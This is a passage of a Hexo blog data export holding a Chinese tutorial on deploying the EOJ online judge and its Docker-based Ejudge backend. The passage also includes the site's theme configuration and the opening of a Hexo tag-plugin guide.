运行容器\n```bash\nsudo docker run -d -p 5000:5000 -v /path/to/your/run/:/ejudge/run <imageName>\n```\n`/path/to/your/run/:/ejudge/run`要修改成自己的`ejudge/run`的路径。\n<imageName>可以运行`docker images`进行查看，也可以是`<image ID>`。\n此时登录EOJ，进入后台->Servers，点击Add Server。\n```nohighlight\n名字: 随便\nIP：Address: 127.0.0.1\n端口号: 5000\n秘钥: naive\n```\n点击确定，并把这个Server设为Enable。\n# 判题\n```bash\npython3 manage.py runserver 0.0.0.0:80 & python3 manage.py qcluster\n```\n# 其他\n发现非superuser查看题目显示`EOJ is closed`,此时打开`utils/site_settings.py`，找到` is_site_closed`函数,把`return True`改为`return False`即可。\n发现一个问题,服务器重启后题目要重新发布，否则无法判题。\n# 后记\n**以上，EOJ搭建完毕，后续可能有一些其他的小问题，欢迎留言。**","source":"_posts/EOJ.md","raw":"---\ntitle: EOJ 搭建教程\ndate: 2019-06-18 10:53:33\ncategories:\n  - Web\n  - OJ\ntags:\n  - EOJ\nabbrlink: f29422fd\n---\n# EOJ\n## 克隆EOJ\n```bash\ngit clone https://github.com/ultmaster/eoj3.git\ncd eoj3\n```\n然后执行\n```bash\nsh install.sh\n```\n## 安装依赖\n```bash\npip3 install -r requirements.txt\n```\n如果出现以下情况\n`Command \"python setup.py egg_info\" failed with error code 1 in /tmp/pip-build-twvou5gt/msqlclient/`\n执行以下命令\n```bash\nsudo apt-get install libmysqld-dev\n```\n<!--more-->\n## 安装npm\n```bash\nsudo apt-get install npm\ncd static\nnpm install\ncd ..\n```\n## 创建超级用户\n```bash\npip install django\npython3 manage.py createsuperuser\n```\n## 迁移\n```bash\npython3 manage.py collectstatic\npython3 manage.py makemigrations\npython3 manage.py migrate\n```\n## 运行前端\n运行前先安装一下`redis-server`。\n```bash\nsudo apt-get install redis-server\n```\n此时，可以运行server了。\n```bash\npython3 manage.py runserver 0.0.0.0:80\n```\n此时访问前端，发现页面布局有问题，是因为缺少一个 css 文件，执行下面命令即可。\n```bash\nwget --no-check-certificate -P ./static/css https://acm.ecnu.edu.cn/static/css/app.min.css\n```\n# Ejudge\n## 克隆Ejudge\n随便找个目录，进行以下操作。\n```bash\ngit clone https://github.com/ultmaster/ejudge.git\n```\n## 初始化\n```bash\ncd ejudge\nsh init.sh\n```\n## 安装docker\n```bash\nsudo apt-get install -y docker.io\nsudo apt-get install systemctl\nsystemctl start docker\nsystemctl enable docker\n```\n## 搭建镜像\n修改`ejudge/run/defaultspj/LANG`,将`LANG`文件的回车去掉。\n```bash\nsudo docker build .\n```\n## 运行容器\n```bash\nsudo docker run -d -p 5000:5000 -v /path/to/your/run/:/ejudge/run <imageName>\n```\n`/path/to/your/run/:/ejudge/run`要修改成自己的`ejudge/run`的路径。\n<imageName>可以运行`docker images`进行查看，也可以是`<image ID>`。\n此时登录EOJ，进入后台->Servers，点击Add Server。\n```nohighlight\n名字: 随便\nIP：Address: 127.0.0.1\n端口号: 5000\n秘钥: naive\n```\n点击确定，并把这个Server设为Enable。\n# 判题\n```bash\npython3 manage.py runserver 0.0.0.0:80 & python3 manage.py qcluster\n```\n# 其他\n发现非superuser查看题目显示`EOJ is closed`,此时打开`utils/site_settings.py`，找到` is_site_closed`函数,把`return True`改为`return False`即可。\n发现一个问题,服务器重启后题目要重新发布，否则无法判题。\n# 后记\n**以上，EOJ搭建完毕，后续可能有一些其他的小问题，欢迎留言。**","slug":"EOJ","published":1,"updated":"2020-05-11T09:37:12.362Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkal000lqse58ig59cci","content":"<h1 id=\"EOJ\"><a href=\"#EOJ\" class=\"headerlink\" title=\"EOJ\"></a>EOJ</h1><h2 id=\"克隆EOJ\"><a href=\"#克隆EOJ\" class=\"headerlink\" title=\"克隆EOJ\"></a>克隆EOJ</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ultmaster/eoj3.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> eoj3</span><br></pre></td></tr></table></figure>\n<p>然后执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh install.sh</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>\n<p>如果出现以下情况<br><code>Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-twvou5gt/msqlclient/</code><br>执行以下命令<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install libmysqld-dev</span><br></pre></td></tr></table></figure><br><a id=\"more\"></a></p>\n<h2 id=\"安装npm\"><a href=\"#安装npm\" class=\"headerlink\" title=\"安装npm\"></a>安装npm</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install npm</span><br><span class=\"line\"><span class=\"built_in\">cd</span> static</span><br><span class=\"line\">npm install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建超级用户\"><a href=\"#创建超级用户\" class=\"headerlink\" title=\"创建超级用户\"></a>创建超级用户</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install django</span><br><span class=\"line\">python3 manage.py createsuperuser</span><br></pre></td></tr></table></figure>\n<h2 id=\"迁移\"><a href=\"#迁移\" class=\"headerlink\" title=\"迁移\"></a>迁移</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py collectstatic</span><br><span class=\"line\">python3 manage.py makemigrations</span><br><span class=\"line\">python3 manage.py migrate</span><br></pre></td></tr></table></figure>\n<h2 id=\"运行前端\"><a href=\"#运行前端\" class=\"headerlink\" title=\"运行前端\"></a>运行前端</h2><p>运行前先安装一下<code>redis-server</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><br>此时，可以运行server了。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py runserver 0.0.0.0:80</span><br></pre></td></tr></table></figure><br>此时访问前端，发现页面布局有问题，是因为缺少一个 css 文件，执行下面命令即可。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --no-check-certificate -P ./static/css https://acm.ecnu.edu.cn/static/css/app.min.css</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Ejudge\"><a href=\"#Ejudge\" class=\"headerlink\" title=\"Ejudge\"></a>Ejudge</h1><h2 id=\"克隆Ejudge\"><a href=\"#克隆Ejudge\" class=\"headerlink\" title=\"克隆Ejudge\"></a>克隆Ejudge</h2><p>随便找个目录，进行以下操作。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ultmaster/ejudge.git</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ejudge</span><br><span class=\"line\">sh init.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装docker\"><a href=\"#安装docker\" class=\"headerlink\" title=\"安装docker\"></a>安装docker</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y docker.io</span><br><span class=\"line\">sudo apt-get install systemctl</span><br><span class=\"line\">systemctl start docker</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> docker</span><br></pre></td></tr></table></figure>\n<h2 id=\"搭建镜像\"><a href=\"#搭建镜像\" class=\"headerlink\" title=\"搭建镜像\"></a>搭建镜像</h2><p>修改<code>ejudge/run/defaultspj/LANG</code>,将<code>LANG</code>文件的回车去掉。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker build .</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"运行容器\"><a href=\"#运行容器\" class=\"headerlink\" title=\"运行容器\"></a>运行容器</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -d -p 5000:5000 -v /path/to/your/run/:/ejudge/run &lt;imageName&gt;</span><br></pre></td></tr></table></figure>\n<p><code>/path/to/your/run/:/ejudge/run</code>要修改成自己的<code>ejudge/run</code>的路径。</p>\n<p><imageName>可以运行<code>docker images</code>进行查看，也可以是<code>&lt;image ID&gt;</code>。<br>此时登录EOJ，进入后台-&gt;Servers，点击Add Server。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">名字: 随便</span><br><span class=\"line\">IP：Address: 127.0.0.1</span><br><span class=\"line\">端口号: 5000</span><br><span class=\"line\">秘钥: naive</span><br></pre></td></tr></table></figure><br>点击确定，并把这个Server设为Enable。</p>\n<h1 id=\"判题\"><a href=\"#判题\" class=\"headerlink\" title=\"判题\"></a>判题</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py runserver 0.0.0.0:80 &amp; python3 manage.py qcluster</span><br></pre></td></tr></table></figure>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>发现非superuser查看题目显示<code>EOJ is closed</code>,此时打开<code>utils/site_settings.py</code>，找到<code>is_site_closed</code>函数,把<code>return True</code>改为<code>return False</code>即可。<br>发现一个问题,服务器重启后题目要重新发布，否则无法判题。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><strong>以上，EOJ搭建完毕，后续可能有一些其他的小问题，欢迎留言。</strong></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1463,"excerpt":"<h1 id=\"EOJ\"><a href=\"#EOJ\" class=\"headerlink\" title=\"EOJ\"></a>EOJ</h1><h2 id=\"克隆EOJ\"><a href=\"#克隆EOJ\" class=\"headerlink\" title=\"克隆EOJ\"></a>克隆EOJ</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ultmaster/eoj3.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> eoj3</span><br></pre></td></tr></table></figure>\n<p>然后执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh install.sh</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>\n<p>如果出现以下情况<br><code>Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-twvou5gt/msqlclient/</code><br>执行以下命令<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install libmysqld-dev</span><br></pre></td></tr></table></figure><br>","more":"</p>\n<h2 id=\"安装npm\"><a href=\"#安装npm\" class=\"headerlink\" title=\"安装npm\"></a>安装npm</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install npm</span><br><span class=\"line\"><span class=\"built_in\">cd</span> static</span><br><span class=\"line\">npm install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建超级用户\"><a href=\"#创建超级用户\" class=\"headerlink\" title=\"创建超级用户\"></a>创建超级用户</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install django</span><br><span class=\"line\">python3 manage.py createsuperuser</span><br></pre></td></tr></table></figure>\n<h2 id=\"迁移\"><a href=\"#迁移\" class=\"headerlink\" title=\"迁移\"></a>迁移</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py collectstatic</span><br><span class=\"line\">python3 manage.py makemigrations</span><br><span class=\"line\">python3 manage.py migrate</span><br></pre></td></tr></table></figure>\n<h2 id=\"运行前端\"><a href=\"#运行前端\" class=\"headerlink\" title=\"运行前端\"></a>运行前端</h2><p>运行前先安装一下<code>redis-server</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><br>此时，可以运行server了。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py runserver 0.0.0.0:80</span><br></pre></td></tr></table></figure><br>此时访问前端，发现页面布局有问题，是因为缺少一个 css 文件，执行下面命令即可。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --no-check-certificate -P ./static/css https://acm.ecnu.edu.cn/static/css/app.min.css</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Ejudge\"><a href=\"#Ejudge\" class=\"headerlink\" title=\"Ejudge\"></a>Ejudge</h1><h2 id=\"克隆Ejudge\"><a href=\"#克隆Ejudge\" class=\"headerlink\" title=\"克隆Ejudge\"></a>克隆Ejudge</h2><p>随便找个目录，进行以下操作。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/ultmaster/ejudge.git</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ejudge</span><br><span class=\"line\">sh init.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装docker\"><a href=\"#安装docker\" class=\"headerlink\" title=\"安装docker\"></a>安装docker</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y docker.io</span><br><span class=\"line\">sudo apt-get install systemctl</span><br><span class=\"line\">systemctl start docker</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> docker</span><br></pre></td></tr></table></figure>\n<h2 id=\"搭建镜像\"><a href=\"#搭建镜像\" class=\"headerlink\" title=\"搭建镜像\"></a>搭建镜像</h2><p>修改<code>ejudge/run/defaultspj/LANG</code>,将<code>LANG</code>文件的回车去掉。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker build .</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"运行容器\"><a href=\"#运行容器\" class=\"headerlink\" title=\"运行容器\"></a>运行容器</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -d -p 5000:5000 -v /path/to/your/run/:/ejudge/run &lt;imageName&gt;</span><br></pre></td></tr></table></figure>\n<p><code>/path/to/your/run/:/ejudge/run</code>要修改成自己的<code>ejudge/run</code>的路径。</p>\n<p><imageName>可以运行<code>docker images</code>进行查看，也可以是<code>&lt;image ID&gt;</code>。<br>此时登录EOJ，进入后台-&gt;Servers，点击Add Server。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">名字: 随便</span><br><span class=\"line\">IP：Address: 127.0.0.1</span><br><span class=\"line\">端口号: 5000</span><br><span class=\"line\">秘钥: naive</span><br></pre></td></tr></table></figure><br>点击确定，并把这个Server设为Enable。</p>\n<h1 id=\"判题\"><a href=\"#判题\" class=\"headerlink\" title=\"判题\"></a>判题</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py runserver 0.0.0.0:80 &amp; python3 manage.py qcluster</span><br></pre></td></tr></table></figure>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>发现非superuser查看题目显示<code>EOJ is closed</code>,此时打开<code>utils/site_settings.py</code>，找到<code>is_site_closed</code>函数,把<code>return True</code>改为<code>return False</code>即可。<br>发现一个问题,服务器重启后题目要重新发布，否则无法判题。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p><strong>以上，EOJ搭建完毕，后续可能有一些其他的小问题，欢迎留言。</strong></p>"},{"title":"文档 | HEXO","date":"2019-04-02T10:20:22.000Z","abbrlink":"ffbd0586","updated":"2020-05-11T09:36:10.506Z","_content":"# 引用\n标签插件和 `Front-matter` 中的标签不同，它们是用于在文章中快速插入特定内容的插件。\n<!--more-->\n\n## 引用块\n在文章中插入引言，可包含作者、来源和标题。\n**别号：** quote\n\n```nohilight\n{% blockquote [author[, source]] [link] [source_link_title] %}\ncontent\n{% endblockquote %}\n```\n\n### 样例\n\n**没有提供参数，则只输出普通的 blockquote**\n\n```nohilight\n{% blockquote %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.\n{% endblockquote %}\n```\n\n{% blockquote %}\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.\n{% endblockquote %}\n\n**引用书上的句子**\n\n```nohilight\n{% blockquote David Levithan, Wide Awake %}\nDo not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.\n{% endblockquote %}\n```\n\n{% blockquote David Levithan, Wide Awake %}\nDo not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.\n{% endblockquote %}\n\n**引用 Twitter**\n\n```nohilight\n{% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %}\nNEW: DevDocs now comes with syntax highlighting. http://devdocs.io\n{% endblockquote %}\n```\n\n{% blockquote @DevDocs https://twitter.com/devdocs/status/356095192085962752 %}\nNEW: DevDocs now comes with syntax highlighting. http://devdocs.io\n{% endblockquote %}\n\n**引用网络上的文章**\n\n```nohilight\n{% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %}\nEvery interaction is both precious and an opportunity to delight.\n{% endblockquote %}\n```\n\n{% blockquote Seth Godin http://sethgodin.typepad.com/seths_blog/2009/07/welcome-to-island-marketing.html Welcome to Island Marketing %}\nEvery interaction is both precious and an opportunity to delight.\n{% endblockquote %}\n\n## 代码块\n\n在文章中插入代码。\n\n**别名：** code\n\n```nohilight\n{% codeblock [title] [lang:language] [url] [link text] %}\ncode snippet\n{% endcodeblock %}\n```\n\n### 样例\n\n**普通的代码块**\n\n```nohilight\n{% codeblock %}\nalert('Hello World!');\n{% endcodeblock %}\n```\n\n{% codeblock 